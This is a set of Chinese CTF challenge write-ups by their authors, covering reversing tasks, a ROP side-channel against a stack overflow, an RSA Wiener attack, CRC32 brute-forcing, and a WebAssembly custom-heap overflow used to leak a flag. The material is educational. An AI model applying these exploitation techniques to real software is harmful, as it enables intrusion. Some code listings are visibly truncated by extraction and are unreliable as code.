真正的加密和解密过程很简单，就是一个标准的rc6，只要把函数中的那个int常量放到google里搜索一下就知道是rc6加密（这个函数的代码被rc4加密了，不不解密是看不到的）。 rc6加密和解密的代码见源码 程序流程 程序首先判断启动参数，如果argc为1，则以debugger身份启动，利用fork分出parent和child。parent作为真正的debugger，child利用execve来启动自身并以父进程的pid作为启动参数。 如果argc为2，说明是debuggee。程序利用puts打印plz_input_flag，但是write的syscall被ptrace hook了。puts的原始内容是乱码，需要debugger对其进行解密。 然后是利用scanf来接收flag。默认是允许输入%48s但是这里ptrace hook了read syscall，检测read syscall触发的次数（在程序开头利用setbuf将stdin和stdout的缓冲调整为0）,从而使flag的真实最大长度为32。 接着是一段判断是否调试者为父进程的代码，没问题的话会调用fclose来关闭之前打开的文件。此处用ptrace hook了close syscall。但是在程序运行前也会调用close syscall。这里利用设置变量的方式，使得在第二次close的时候触发。 触发时执行的代码是利用rc4将两个函数解密，然后patch代码为0xcc使程序停在检测trace代码的下一行，在将其patch成jmp到data段的那段唯一可视的雷军ascii字符处，并将flag传递给rdx，接着继续执行。雷军那段ascii其实是代码。前面的52Mi!是xor eax, 0x21694d32，从而使后面的jne全部成立，R_是push rdx;pop rdi，从而将之前在rdx中的flag传递到rdi中。利用u_这个jne跳转跳过中间的非代码区，最后jmp到encrypt函数中。 encrypt函数就是调用rc6加密，将32位的flag分16位两次加密，最后和enc结果比较。 由于调用了很多的ptrace来实现smc和hook，纯动态分析应该不太可能实现，需要静态分析后patch程序才能使用动态分析。 完整程序见github，由于有smc部分，可能在不同机子上编译结果不正确，所以提供了一个测试用的binary。 ippatsu-nyuukon 0x00 写在前面 　设计思路：　应用层与驱动层通信，在驱动层加密由应用层发送过来的明文后比较flag，并输出结果　　部分细节： 驱动层的分发函数分为2部分，SEND和RECV；SEND：接受从应用层发来的明文并加密，其本体是DESRECV：比较加密后的明文和加密flag 驱动层接受的明文，实际上只有第一次加密结果是正确的 DES后将不可视数据转为hex 加密数据与加密flag比较前先异或同一个随机字节 0x01 wp 跟到分发函数的SEND, 定位加密算法因为DES对称加密算法，所以从ida中抠出来，修改小部分并添加密文+key就可以跑解密脚本了 // desrypt_des.cpp #include #include #define maxn 0x8000 // 理论支持明文长度 //#define ENCODE 0,16,1 // 加密用的宏 #define DECODE 15,-1,-1 // 解密用的宏 // 明文初始置换 char msg_ch[64] = { 58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7 }; // 密钥初始置换 char key_ch[56] = { 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4 }; // 扩展置换 char msg_ex[48] = { 32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 }; // 每轮密钥的位移 char key_mov[16] = { 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 }; // 压缩置换 char key_cmprs[48] = { 14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32 }; // S 盒置换 char s_box[8][6][16] = { // S1 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13, // S2 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9, // S3 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12, // S4 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14, // S5 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3, // S6 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13, // S7 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12, // S8 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11 }; // P 盒置换 char p_box[32] = { 16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25 }; // 末置换 char last_ch[64] = { 40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25 }; // hash 置换，将加密后的密文置换为可读明文 char hs_ch[20] = \"0123456789abcdef\"; char sh_ch[128]; void init_trans() { char i; for (i = 0; i 0; j--) { dest[(i >= 1; } } } // 二进制转成字符 void BitToCh(char* dest, char* src, int length) { int i; for (i = 0; i > 3] > 3] |= src[i + 1]; // 添加到末位 } dest[length] = 0; } // 批置换，以offset为偏移，以count为长度 void BatchSet(char* dest, char* src, char* offset, int count) { int i; for (i = 0; i > 1] = (dest[i >> 1] 简单来说 只要把加密宏[0, 16 ,1]替换为[15, -1, -1]解密宏即可。 flag: hctf{Dr1v5r_M5ngM4n_2Oi7} ps: 附一张成功cm的截图 babystack 这题的名字叫babystack，程序中是一个直接的栈溢出。而且还自带一次任意地址读。当然这题的难点也很简单，只有read，write，open，exit系统调用。之所以搞出这个题目是受defcon的mute那题的启发。mute那题是用shellcode来实现的侧信道攻击。所以我就想能否用rop来实现侧信道的攻击。 下面是我在libc里找到的一个可以用来侧信道攻击的ROP .text:00000000000D72CE cmp cl, [rsi] .text:00000000000D72D0 jz short loc_D7266 .text:00000000000D72D2 pop rbx .text:00000000000D72D3 retn 在ret之后用一个read函数来block住代码。而比较成功之后则直接crash退出。使用这种方法来逐字节的比较flag。当然，解法不止这一种。libc里还有很多种的rop可以用来进行侧信道攻击。可以看看选手们的解法. poc见github babyre 这个题目的难度其实处在第三层和第四层之间。当初把它放第四层其实有点犹豫，因为感觉会有老司机秒杀他。 这个题目说起来其实很简答，我写了一个蒙哥马利乘算法和一个大整数加减的库。熟悉密码学的大佬应该知道蒙哥马利乘运算的作用就是进行快速模幂运算，即RSA的核心算法。有关蒙哥马利算法的文章网上其实有很多，我就不再赘述了。代码中只有e和n。将输入的flag转换成大数的形式，然后做en = pow(f,e,n)输出了大数en。这里用了一个非常大的e，使得可以用Wiener's attack来计算出d的值。然后用d即可解密出flag。 之所以认为他简单，是因为即使不知道蒙哥马利乘运算也能够猜出是RSA。首先是因为大整数加减以及乘运算，这些大整数运算还是很容易就可以分辨的。一旦分辨出这些运算，应该就能联想到RSA。第二个就是模幂运算化简式子。对于一个D=C**E%N的大数运算，可以采用下面的化简式子。 D=1 FOR i=n TO 0 D=D*D % N IF E[i]=1 D=D*C % N RETURN D 能看出这个式子是模幂运算的化简式子，即使看不懂乘法函数是个什么鬼。应该也能猜到什么了。 rroopp 之所以写这个题目，只有一次在写实际栈溢出利用的时候碰到了这个情况。栈溢出是在链接库中，没有打开的可以leak用的文件描述符。而主程序就只有这么一点点代码。当时自己写rop的时候感觉挺有意思的，就拿出来写了这样一个题目(主程序是我直接patch当初那个程序来的，没有源码。可以猜猜是什么程序：) 当然launch.so就是我自己写的程序了。里面大致模拟了ipv4包解析的过程。当然也是一个直接的栈溢出。在最后合并包的时候并没有检查长度而是使用了一个固定长度的栈缓冲区。 当然虽然binary比较小，其实还是有挺多可以用的gadget的。这里还有一个很好玩的技巧，就是dlsym的handle可以指定为RTLD_DEFAULT和RTLD_NEXT来从已经加载的动态链接库中查找函数。所以无需指定handle的值可以可以调用libc中的函数的。 old driver 这个逆向题目其实也是一个算法题，很可惜没有人能做出来。写这个题目的初衷是我上学期上的数据压缩实验。这个算法期末占15分huaji.jpg 好吧，这个压缩算法其实就是jpeg压缩算法拉。当然和现在通用的jpg图片的压缩算法还是有点差别的，是最初最简单的那个版本。有关jpeg压缩算法的介绍其实挺多的。如果不是像我一样不习惯用MATLAB的话。其实用MATLAB解这东西其实是最快的。 当然jpeg压缩其实也有很多的特征可以查找的。包括DFT算法实现，包括量化用的标准量化表，包括最后做哈弗曼编码所用的哈弗曼表。其实都是非常明显的特征。最明显的就是jpeg压缩所使用的量化表了。抠出来一查就能发现。 decode.py就是我自己写的重建jpeg用的函数。当然如果发现重建的图像非常魔性也不要惊讶。是我压缩比率调整的太高的原因。反正能看到flag就可以了2333 online encryptor 背景 这题由于放题的时候失误没把题开始就放上去，所以剩下的时间可能不够去做了。而且好像有被题目名误导到的人（ 。回到题目，这题是一个披着web和crypt皮的pwn题。事实上，在之前刚看到wasm的时候我就有想能不能搞个pwn出来。然后这次也算是实现了自己的一些想法。 webassembly (以下简称wasm) 技术目前可以说并不完善，而且我也并不算是了解了整个系统的全貌，因此如果有理解不到位的地方请见谅，欢迎一起讨论。 事实上，在wasm技术提出之前就已经有类似技术出现了（asm.js），wasm和asm.js不同的是wasm创建了二进制文件格式（.wasm）和新的汇编语言。比如helloword的汇编看上去就是这样的（会lisp的同学看起来大概没啥鸭梨） (module (type $FUNCSIG$ii (func (param i32) (result i32))) (type $FUNCSIG$iii (func (param i32 i32) (result i32))) (import \"env\" \"iprintf\" (func $iprintf (param i32 i32) (result i32))) (table 0 anyfunc) (memory $0 1) (data (i32.const 16) \"hello world!\\00\") (export \"memory\" (memory $0)) (export \"hello\" (func $hello)) (export \"test\" (func $test)) (func $hello (drop (call $iprintf (i32.const 16) (i32.const 0) ) ) ) (func $test (result i32) (i32.const 16) ) ) 关于这些指令的具体意义可以去官方文档上看。这里就不多展开了。两者的目标相接近，都是为了能用c/c++语言写web（可以想象一下js那效率。。。），所以这题的wasm当然也是c写的。 然后怎么出成一个pwn呢，wasm存在函数栈，但这部分是有严格check的（可以类比下python的，其实js引擎负责解析wasm的部分也是个解释器），而且这个栈是对用户隐藏的，也就是搞栈这条路断了（至少我没想出来怎么搞这个栈），于是打算出一个关于堆的pwn。 这题本来想用emcc编译，但emcc编译出来的wasm和js复杂难懂。。。至少我觉得如果我用emcc编译出来那是99%没人做出来的。所以用了clang+binaryen+wabt 来生成wasm。接下来介绍几个必要的姿势： 1. memory layout wasm的memory默认是从0开始向下拓展，以10k为一个基本单位，当内存不够的时候可以通过grow指令增长，当然js层也有相应的接口可以调用。memory里面会有全局变量，当然你想放啥都可以，自己实现一个堆管理或者直接用glibc的那个堆管理都是可以的。同样，js层和c层都可以对其中的内存进行读写操作。 2. js层和c层的互相调用 js调用c层可以通过在c层定义好相应的函数，然后export，直接就能在js层调用，这里说一个参数问题。 wasm用的是32位，也就是参数和返回值都可以当作uint32_t，对于js来说这就是单纯的一个数字，但对于c来说如果你是char* ，那么它就是指向memory地址的一个char指针。如果是int，就是整形，这点就会有一个问题，就是你如果想在js传字符串到c那边，得对memory做操作，而不能直接把js的字符串当做参数传。 c层调用js也是类似的，在js那边预先定义好一系列函数然后放在同一个object里传进wasm的环境。再说一遍，这儿的参数和返回值也都得是uint32_t。 3. c层的限制 由于是用js做为环境而不是linux的环境，所以很大一部分的c库函数都无法使用，当然要用也可以，可以用js模拟出一个linux的环境（把syscall都自己用js实现一遍），可能有现成的，但为了保持题目简洁，我并没有引用glibc的函数。期待以后wasm能有自己的底层环境而不用去依赖js。 回到题目 这题是一个nodejs作为后端的在线加密器，在js层调用了wasm进行加解密操作。可以输入一个8字节的password和任意字节的data做加解密 加密为流加密，逻辑大概是这样的： key = hash(hash(flag)^pass)^random; 其中hash函数是我自己实现的（乱写的），接受任意字节，返回16字节；flag为32字节，pass为8字节，random为16字节，通过js层的random获取。 output = random | enc(data, key); enc函数内部会把key拆成4字节的4部分，利用 mt_rand 作为PRNG把data加密4次。 解密流程相同 但看这个加解密是拿不到flag的，因为flag在最开始就被hash了。所以这题就是pwn啦。 然后堆是自己实现的，其中 struct chunk { unsigned int size; unsigned int pre_size; struct chunk* fd; }; 题外话，自己写过堆之后才发现这种结构是不可取的啊，具体的就是这个pre_size的field没法重利用了。反正不管，这里的pre_size和fd都不会重利用（偷懒）; 不同size的堆块放在不同size区间（间隔0x10）的单链表里，但不会做align, `#define find_index(size) ((size/0x10) > 0x20 ? 0x1f : (size/0x10)) ;` 用单链表实现了类似unlink一样的效果： void unlink(struct chunk* current) { int index = find_index(current->size); struct chunk* ite = bins[index]; if(ite != 0) { while(ite->fd != 0) { if(ite->fd == current) { ite->fd = current->fd; break; } ite = ite -> fd; } } } 也可以做merge，具体源码在github上，可以看到，基本全程没啥check，一些glibc用不到的技巧都可以用了！ 说了这么多，洞在哪呢？？以下为wasm2wast 跑出来wast的一部分 (export \"memory\" (memory 0)) (import \"env\" \"grow\" (func (;0;) (type 1))) (import \"env\" \"read_data\" (func (;1;) (type 1))) (import \"env\" \"read_file\" (func (;2;) (type 2))) (import \"env\" \"read_pass\" (func (;3;) (type 1))) (import \"env\" \"read_random\" (func (;4;) (type 1))) 这些是内部函数同import 函数名之间的关系 (export \"malloc\" (func 5)) (export \"unlink\" (func 6)) (export \"free\" (func 7)) (export \"Initialize\" (func 8)) (export \"ExtractU32\" (func 9)) (export \"hash\" (func 10)) (export \"mycrypt\" (func 11)) (export \"encrypt\" (func 12)) (export \"decrypt\" (func 13)) (export \"out_size\" (func 14)) 这些是内部函数与export 函数名之间的关系 来看看decrypt函数 (func (;13;) (type 0) (result i32) (local i32 i32 i32 i32 i32 i32 i32) i32.const 32 call 5 set_local 5 i32.const 1024 call 5 set_local 0 i32.const 8 call 5 set_local 1 i32.const 16 call 5 set_local 2 i32.const 2672 get_local 5 i32.const 32 call 2 drop get_local 0 call 1 set_local 3 get_local 1 call 3 drop i32.const 0 set_local 6 block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 16 i32.eq br_if 1 (;@1;) get_local 2 get_local 6 i32.add get_local 0 get_local 6 i32.add i32.load8_u i32.store8 get_local 6 i32.const 1 i32.add set_local 6 br 0 (;@2;) end end get_local 5 i32.const 32 call 10 set_local 4 i32.const 0 set_local 6 block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 8 i32.eq br_if 1 (;@1;) get_local 4 get_local 6 i32.add tee_local 5 get_local 5 i32.load8_u get_local 1 get_local 6 i32.add i32.load8_u i32.xor i32.store8 get_local 6 i32.add i32.load8_u i32.xor i32.store8 get_local 6 i32.const 1 i32.add set_local 6 br 0 (;@2;) end end get_local 1 call 7 get_local 4 i32.const 16 call 10 set_local 1 get_local 4 call 7 i32.const 0 set_local 6 block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 16 i32.eq br_if 1 (;@1;) get_local 1 get_local 6 i32.add tee_local 5 get_local 5 i32.load8_u get_local 2 get_local 6 i32.add i32.load8_u i32.xor i32.store8 get_local 6 i32.const 1 i32.add set_local 6 br 0 (;@2;) end end get_local 2 call 7 get_local 1 get_local 0 i32.const 16 i32.add get_local 3 call 5 tee_local 6 get_local 3 i32.const -16 i32.add tee_local 2 call 11 i32.const 0 get_local 2 i32.store offset=2680 get_local 0 call 7 get_local 6) 看上去很长，把这个decrypt函数稍微翻译下： 看上去很长，把这个decrypt函数稍微翻译下： (func (;decrypt;) (type 0) (result i32) (local i32 i32 i32 i32 i32 i32 i32) i32.const 32 call malloc set_local 5 // var_5 = malloc(32); i32.const 1024 call malloc set_local 0 // var_0 = malloc(1024); i32.const 8 call malloc set_local 1 // var_1 = malloc(8); i32.const 16 call malloc set_local 2 // var_2 = malloc(16); i32.const 2672 get_local 5 i32.const 32 call read_file // readfile(21, var_5, 2672); drop get_local 0 call read_data set_local 3 // var_3 = read_data(var_0); get_local 1 call read_pass // read_pass(var_1); drop i32.const 0 set_local 6 // var_6 = 0; block ;; label = @1 loop ;; label = @2 // while; get_local 6 i32.const 16 i32.eq br_if 1 (;@1;) // if(var_6 == 16) break; get_local 2 get_local 6 i32.add // var_2 + var_6; get_local 0 get_local 6 i32.add // var_0 + var_6; i32.load8_u i32.store8 // *(var_2 + var_6) = *(var_0+var_6); get_local 6 i32.const 1 i32.add set_local 6 br 0 (;@2;) // var_6 += 1; end end get_local 5 i32.const 32 call hash set_local 4 // var_4 = hash(var_5, 32); i32.const 0 set_local 6 // var_6 = 0; block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 8 i32.eq br_if 1 (;@1;) // if(var_6 == 8) break; get_local 4 get_local 6 i32.add // var_4 + var_6; tee_local 5 // var_5 = var_4 + var_6 get_local 5 i32.load8_u // *var_5; get_local 1 get_local 6 i32.add // var_1 + var_6; i32.load8_u // *(var_1 + var_6); i32.xor i32.store8 // *(var_4 + var_6) ^= *var_5; get_local 6 i32.const 1 i32.add set_local 6 // var_6 += 1; br 0 (;@2;) end end get_local 1 call free // free(var_!); get_local 4 i32.const 16 call hash set_local 1 // var_1 = hash(var_4, 16) get_local 4 call free // free(var_4); i32.const 0 set_local 6 // var_6 = 0; block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 16 i32.eq br_if 1 (;@1;) // if(var_6 == 16) break; get_local 1 get_local 6 i32.add tee_local 5 get_local 5 i32.load8_u get_local 2 get_local 6 i32.add i32.load8_u i32.xor i32.store8 // 和之前一样(var_1 + var_6) ^= (var_2 + var_6); get_local 6 i32.const 1 i32.add set_local 6 // var_6 += 1; br 0 (;@2;) end end get_local 2 call free // free(var_2); get_local 1 // var_1 get_local 0 i32.const 16 i32.add // var_0 + 16 get_local 3 call malloc // out = malloc(var_3); tee_local 6 get_local 3 i32.const -16 i32.add // var_3 - 16 tee_local 2 // var2 = var_3 - 16 call mycrypt // mycrypt(var_1 ,var_0 + 16, out, var_3 - 16) i32.const 0 get_local 2 i32.store offset=2680 // *(2680) = var_2; get_local 0 call free // free(var_0); get_local 6) 这样就翻译的差不多了，应该和我开始对加解密的描述差不多，可以发现，js层传入的data长度最长可以有0x1000个字节，但从decrypt函数可以看出data这只malloc了1024个字节，于是多出来的就造成了一个堆溢出，可以利用类似方式（手工）对其他函数包括malloc和free函数进行逆向，虽然工作会艰辛很多233。 接下来我们来看看如何利用，来看看开始的那几个malloc之后的layout heapbase: flag key+32+12: data data+1024+12: pass pass+8+12: random 可以看到data下面就是pass和random，除了flag没有被free（这是我觉得强行出题的一点。。。），下面的pass和random都会在用完之后被free，那么就想想怎么把flag leak出来吧！ 接下来的部分可能对不了解堆内部的人很模糊，如果没看过源码或者自己逆过就别看了==== 默认你已经知道这个堆和加解密部分的实现了。 可以想到的一个最简单的方式是让最后output指针malloc到flag前面，然后修改2680那个outsize到合适大小（如果大小超过了memory长度，不会反回结果）。问题是在于怎么实现，我们能做的： 在程序开始的时候溢出data块，能拿到两个可控的即将被free的堆块 最后修改outsize的时候只有一个操作就是free(data); 也就是得在free之后改掉2680那个size 做到这两点在glibc里应该是不可能的，但这个堆没有任何check。 做到这个的最关键的一点在merge的时候 void free(unsigned char* ptr) { struct chunk* current = to_chunk(ptr); struct chunk* next = next_chunk(current); if(!(current->size & 1)) { struct chunk* pre = to_mem(current) - current->pre_size - 12; pre->size += ((current->size&0xfffffffe) + 12); // unlink pre unlink(pre); current = pre; } ... } 不会有任何的check，也就是我们能把当前的size加到prev块的size位上，但prev块的size位的位置是由当前堆块的pre_size位决定的，于是就能在前面任意位置加上当前size，只是这个size不能太大，不然在找当前块的下一块的时候会超出memory长度。 现在有任意写了，但有一个问题，要做到这点得把当前块的inuse位清0，而data块要改inuse位不容易。因为上面没有任何堆块，而且也不能拿两个能溢出的堆块中一个堆块改size，因为只能加上偶数的size，并不能改变size的inuse位。 没有堆块就自己创建堆块！free的时候会merge上面的堆块，然后merge之后的那个size我们是可控的，在free的最后，会清空下一块的inuse位然后设置pre_size // link current to bins int index = find_index(current->size); current->fd = bins[index]; bins[index] = current; // clear next chunk's inuse bit and set the pre_size next = next_chunk(current); next->size &= 0xfffffffe; next->pre_size = current->size&0xfffffffe; 那么思路就出来了： 覆盖pass堆块，使其merge完的结果在data上面，同时设置data块的size字段 覆盖random堆块，设置data块的pre_size malloc output的结果会到key上面那段 free data块的时候就能把size加到outsize，达到leak 然而实际操作中两个free的堆块在bins中的长度都会超过0x200然后分到最后一个链表，output会优先取random堆块free的那块。所以得把1，2的操作反一下。然后这题就解决了，可喜可贺（ ps：出题人没有源码大概也没法做出来 pps：写堆管理很有意思，出完题看着源码自己日自己写的题还日了一整天也很有意思 ppps：比赛完再逆一遍自己的题不容易，各位要打出题人的请手下留情orz poc： ``` 结果： ��n�&��A�t���oe��.^�����S�;c�d3�### big_zip 由于github上有对6位的crc32的快速爆破脚本，故将文本分为5字节。其实只要将github上的代码稍稍改动就能快速破解5位的crc32了。 # -- coding: utf-8 -- import itertools import binascii import string class crc32_reverse_class(object): # the code is modified from https://github.com/theonlypwner/crc32/blob/master/crc32.py def __init__(self, crc32, length, tbl=string.printable, poly=0xEDB88320, accum=0): self.char_set = set(map(ord, tbl)) self.crc32 = crc32 self.length = length self.poly = poly self.accum = accum self.table = [] self.table_reverse = [] def init_tables(self, poly, reverse=True): \\# build CRC32 table for i in range(256): for j in range(8): if i & 1: i >>= 1 i ^= poly else: i >>= 1 self.table.append(i) assert len(self.table) == 256, \"table is wrong size\" \\# build reverse table if reverse: found_none = set() found_multiple = set() for i in range(256): found = \\[\\] for j in range(256): if self.table\\[j\\] >> 24 == i: found.append(j) self.table_reverse.append(tuple(found)) if not found: found_none.add(i) elif len(found) > 1: found_multiple.add(i) assert len(self.table_reverse) == 256, \"reverse table is wrong size\" def rangess(self, i): return ', '.join(map(lambda x: '\\[{0},{1}\\]'.format(*x), self.ranges(i))) def ranges(self, i): for kg in itertools.groupby(enumerate(i), lambda x: x\\[1\\] - x\\[0\\]): g = list(kg\\[1\\]) yield g\\[0\\]\\[7\\], g\\[-1\\]\\[8\\] def calc(self, data, accum=0): accum = ~accum for b in data: accum = self.table\\[(accum ^ b) & 0xFF\\] ^ ((accum >> 8) & 0x00FFFFFF) accum = ~accum return accum & 0xFFFFFFFF def findReverse(self, desired, accum): solutions = set() accum = ~accum stack = \\[(~desired,)\\] while stack: node = stack.pop() for j in self.table_reverse\\[(node\\[0\\] >> 24) & 0xFF\\]: if len(node) == 4: a = accum data = \\[\\] node = node\\[1:\\] + (j,) for i in range(3, -1, -1): data.append((a ^ node\\[i\\]) & 0xFF) a >>= 8 a ^= self.table\\[node\\[i\\]\\] solutions.add(tuple(data)) else: stack.append(((node\\[0\\] ^ self.table\\[j\\]) = 4: patches = self.findReverse(desired, accum) for patch in patches: checksum = self.calc(patch, accum) print 'verification checksum: 0x{0:08x} ({1})'.format( checksum, 'OK' if checksum == desired else 'ERROR') for item in self.dfs(self.length - 4): patch = map(ord, item) patches = self.findReverse(desired, self.calc(patch, accum)) for last\\_4\\_bytes in patches: if all(p in self.char_set for p in last\\_4\\_bytes): patch.extend(last\\_4\\_bytes) print '\\[find\\]: {1} ({0})'.format( 'OK' if self.calc(patch, accum) == desired else 'ERROR', ''.join(map(chr, patch))) else: for item in self.dfs(self.length): if crc32(item) == desired: print '\\[find\\]: {0} (OK)'.format(item) def crc32_reverse(crc32, length, char_set=string.printable, poly=0xEDB88320, accum=0): ''' :param crc32: the crc32 you wnat to reverse :param length: the plaintext length :param char_set: char_set :param poly: poly , default 0xEDB88320 :param accum: accum , default 0 :return: none ''' obj = crc32_reverse_class(crc32, length, char_set, poly, accum) obj.run_reverse() def crc32(s): ''' :param s: the string to calculate the crc32 :return: the crc32 ''' return binascii.crc32(s) & 0xffffffff from my_crc32 import * l=[0x251dee02, 0xb890530f, 0x6e6b39df, 0x50f684c3, 0xde41b551, 0x24bd35b6, 0xcef2eda8, 0xba2b1745, 0x1f4c7ea9, 0x58b2bfa9, 0x251dee02, 0xe0f81f1e, 0xbd6fbd41, 0x7342a1f6, 0x665648e9, 0xe7c594b3, 0xa60ffdd0, 0xce2ce80b, 0x22459f2d, 0x6f8a6539, 0x2073a2e4, 0x52fa60a8, 0x80410dda, 0xb7c68f27, 0x6e6b39df, 0xbd598041, 0xaa145d64, 0x16da6b3b, 0x7dd590bc, 0xb9eef5a1, 0xf0b958f0, 0x445a43f7, 0x8bd55271, 0xc0340fe2, 0xc0cd9ee5, 0x7fc7de58, 0x53bfec8a, 0x99b5537b, 0xd68019af, 0x73d7ee30, 0x5fbd3f5e] for k in l: crc32_reverse(k,5) print '=======' ``` #You\\_know\\_the\\_bed\\_feels\\_warmer\\_Sleeping\\_here\\_alone\\_You\\_know\\_I\\_dream\\_in\\_color\\_And\\_do\\_the\\_things\\_I\\_want\\_You\\_think\\_you\\_got\\_the\\_best\\_of\\_me\\_Think\\_you\\_had\\_the\\_last\\_laugh\\_Bet\\_you\\_think\\_that\\_everything\\_good\\_is\\_gone crc32爆破完连接成文，很容易发现是最后一个文本。然后使用已知明文攻击即可。（有些人说因为我用7z压缩的zip所以他已知明文一直攻击不成功，我表示是我没有考虑到 pokemon 打开游戏，大木会直接和你疯狂暗示 大木告诉你，FLAG在第一个道馆，去打败馆主。到研究室领精灵，助手给你20个奇异糖果，让你快速升级。再次提醒打败第一个馆主。 一路打怪升级到第一个道馆 打败后 馆主说我不会告诉你的，想知道的话自己去逆向这个rom。正文开始。用PPRE工具。 text_11=\"HIIIIIINT(You-really-want-to-get-the-flag-by-submi ting-it-one-by-one?)\" text_12=\"HIIIIIINT(Try-to-read-the-scrpit-XP)\" text_13=\"HIIIIIINT(Don’t forget to change Brackets to Curly Brackets !!!!)\" 下面是一堆flag，但只有一个是正确的。提示你去看脚本。锁定脚本 Fanfare 1500 Lockall Faceplayer Checkbadge 0 0x800c If 0x800c 1 CheckLR 1 func_5 Message 0 CloseMsgOnKeyPress TrainerBattle 20 0 0 CheckTrainerLost 0x800c If 0x800c 0 CheckLR 1 func_6 Setbdgtrue 0 ActMainEvent 22 SetTrainerId 29 SetTrainerId 50 Setvar 0x4074 1 Setflag 402 Setvar 16648 6 Setflag 244 Setflag 403 Message 1 SetvarHero 0 Message 2 Soundfr 1189 Fadedef Message 3 Jump func_7 到func_7 Setvar 0x8004 378 Setvar 0x8005 1 CheckItem3 0x8004 0x8005 0x800c If 0x800c 0 CheckLR 1 func_15 Callstd 241 7 Setflag 115 Clearflag 741 Setvar 0x8004 378 Setvar 0x8005 1 CheckItem3 0x8004 0x8005 0x800c If 0x800c 0 CheckLR 1 func_16 Message 4 WaitButton CloseMsgOnKeyPress Releaseall End 分析逻辑可知，func_16永远不会被执行到func_16 Message 64 WaitButton CloseMsgOnKeyPress Releaseall End 发现是使用64号text弹出对话框 text_64=\"HCTF(6A0A81AB5F9917B1EEC3A6183C614380)\" get flag `HCTF{6A0A81AB5F9917B1EEC3A6183C614380}` New_Love_Song 